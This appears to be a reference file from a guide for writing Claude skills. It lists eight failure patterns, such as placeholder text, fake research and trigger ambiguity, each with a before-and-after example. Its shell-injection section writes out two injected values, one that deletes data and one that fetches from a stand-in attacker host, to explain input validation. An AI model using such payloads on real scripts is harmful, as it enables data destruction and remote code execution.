# Failure Patterns

8 common failure patterns when creating skills. Each includes a real example, why it fails, and how to fix it. Use this as a checklist during Step 6 (Validate) of the skill creation workflow.

---

## 1. Empty Shell Template

**Symptom**: SKILL.md sections contain placeholder text like "Step one", "Step two", "Describe your workflow here."

**Why it fails**: A skill with placeholder text teaches Claude nothing. The output will be generic because the input is generic.

**Before**:
```markdown
## Core Workflow
1. Step one: Analyze the input
2. Step two: Process the data
3. Step three: Generate output
```

**After**:
```markdown
## Core Workflow
1. **Parse EPUB structure**: Extract `content.opf` → read spine order → map chapter IDs to file paths
2. **Initialize reading state**: Create MoC note in `Zettels/4-Structure/` with book metadata, chapter list, and progress tracker
3. **Chapter-by-chapter reading**: For each chapter: extract text → present key passages → prompt user for notes → save as Zettel with 5-type relations
```

**Detection**: Search for "Step one", "Step two", "TODO", "placeholder", "example.com", "describe", "your X here".

---

## 2. Mock Research

**Symptom**: Research notes contain fabricated data, fake URLs, or example.com references.

**Why it fails**: If the research is fake, every downstream decision is uninformed. The skill will contain generic advice instead of domain-specific methodology.

**Before**:
```markdown
## Research Notes
- Source: https://example.com/best-practices
- Found 15 relevant tools on GitHub
- Expert consensus: always follow best practices
```

**After**:
```markdown
## Research Notes
- Source: Niklas Luhmann's Zettelkasten method (via Sonke Ahrens, "How to Take Smart Notes")
- Found 3 relevant tools: obsidian-search (local, ripgrep-based), Semantic Scholar API (academic), Perplexity (web synthesis)
- Key insight: Bidirectional linking is necessary but not sufficient — notes must be atomic and concept-oriented to enable emergent connections
```

**Detection**: Search for "example.com", "lorem ipsum", "sample data", URLs that return 404.

---

## 3. Over-Engineering

**Symptom**: Complex script pipeline (TypeScript, build tools, multiple dependencies) for a task Claude can do natively by reading SKILL.md.

**Why it fails**: More code = more maintenance, more dependencies, more failure modes. If the core value is methodology (not automation), scripts add complexity without adding capability.

**Before**: 6 TypeScript files requiring `bun`, totaling 50KB, to orchestrate a 5-stage pipeline that generates a template SKILL.md.

**After**: A well-written SKILL.md that Claude reads and follows directly. One optional 100-line bash script for structural validation.

**Detection**: Count scripts. If `scripts/` has more files than `references/` and the skill's core value is methodology, it's probably over-engineered.

---

## 4. No Domain Knowledge

**Symptom**: The skill is so generic it could apply to anything — or nothing. No domain-specific vocabulary, no expert techniques, no named methodologies.

**Why it fails**: A skill about "writing" that doesn't mention Pyramid Principle, inverted pyramid, or any specific writing technique will produce the same output as no skill at all.

**Before**:
```markdown
## Writing Best Practices
- Write clearly
- Use good structure
- Review your work
- Get feedback
```

**After**:
```markdown
## Writing Methodology
- **Lead with the answer** (Minto Pyramid): State your conclusion first, then support with grouped arguments at 3 levels
- **One idea per paragraph**: Each paragraph makes exactly one point — if you can't summarize it in one sentence, split it
- **Cut 30%**: After first draft, delete every word that doesn't add meaning (Zinsser simplicity test)
- **Read aloud**: If you stumble reading it, readers will stumble too
```

**Detection**: Remove the domain-specific nouns. If the advice still makes sense for any domain, it's too generic.

---

## 5. Missing Anti-Patterns

**Symptom**: No "When NOT to Use" section. No failure modes. No common mistakes.

**Why it fails**: Without negative examples, Claude doesn't know the boundaries of the skill. It will apply the skill too broadly or miss failure modes that practitioners know to avoid.

**Before**: Only a "When to Use" section.

**After**:
```markdown
## When NOT to Use
- For editing existing skills — just edit the SKILL.md directly
- For tasks that are a single bash command — don't create a skill for `echo hello`
- When the domain is completely novel and no golden cases exist — research first, create later
```

**Detection**: Search SKILL.md for "NOT", "don't", "avoid", "mistake", "anti-pattern". If none found, this pattern is present.

---

## 6. Trigger Ambiguity

**Symptom**: Description is either too broad (triggers on everything) or too narrow (only triggers on exact command).

**Why it fails**: Too broad → false positives, skill activates when user doesn't want it. Too narrow → users don't discover the skill because their phrasing doesn't match.

**Before (too broad)**:
```yaml
description: "Help with writing tasks"
triggers: ["write", "text", "document"]
```

**Before (too narrow)**:
```yaml
description: "Run the skill creator pipeline"
triggers: ["/create-skill"]
```

**After (balanced)**:
```yaml
description: "Create high-quality skills using case-based methodology from domain masters. Research real examples, extract patterns, generate skills with real content."
triggers: ["create skill", "build skill", "make a skill", "new skill", "design skill"]
```

**Detection**: Count trigger words. < 3 is too narrow, > 10 is too broad. Description should contain domain-specific keywords.

---

## 7. Shell Injection

**Symptom**: User input is passed directly to shell commands without quoting or sanitization.

**Why it fails**: A skill name like `; rm -rf /` or `$(curl evil.com)` will execute arbitrary commands.

**Before**:
```bash
skill_name=$1
git init $skill_name
cd $skill_name && git commit -m "init $skill_name"
```

**After**:
```bash
skill_name="$1"
# Validate: only lowercase letters, numbers, hyphens
if [[ ! "$skill_name" =~ ^[a-z0-9-]+$ ]]; then
  echo "Error: skill name must be lowercase-hyphen-numbers only" >&2
  exit 1
fi
git init "$skill_name"
cd "$skill_name" && git commit -m "init ${skill_name}"
```

**Detection**: Search scripts for `$1`, `$2`, `${var}` without surrounding quotes. Search for backtick command substitution. Check `grep`/`rg` patterns for unescaped user input (should use `-F` for fixed strings).

---

## 8. Runtime Dependency Assumptions

**Symptom**: Scripts assume tools like `bun`, `node`, `python3`, or specific CLI tools are available without checking.

**Why it fails**: The skill will fail silently or with cryptic errors on machines that don't have the assumed tool installed.

**Before**:
```bash
bun run scripts/research.ts "$skill_name"
```

**After**:
```bash
# Check dependencies
for cmd in jq rg; do
  if ! command -v "$cmd" &>/dev/null; then
    echo "Error: $cmd is required but not installed" >&2
    echo "Install: brew install $cmd" >&2
    exit 1
  fi
done
```

**Detection**: Search scripts for command invocations. For each command used, verify there's either a `command -v` check or the command is a bash builtin / POSIX standard.

---

## Quick Checklist

Before finalizing a skill, verify it doesn't have any of these failures:

- [ ] No placeholder text (search: "Step one", "TODO", "placeholder", "example.com")
- [ ] No mock research (all URLs are real or absent, all data is genuine)
- [ ] Scripts are proportional to the task (methodology skills need few/no scripts)
- [ ] Domain-specific vocabulary and named techniques present
- [ ] "When NOT to Use" and "Common Mistakes" sections exist
- [ ] Triggers are balanced (3-7 triggers, description has domain keywords)
- [ ] All variables in shell scripts are quoted
- [ ] Runtime dependencies are checked before use
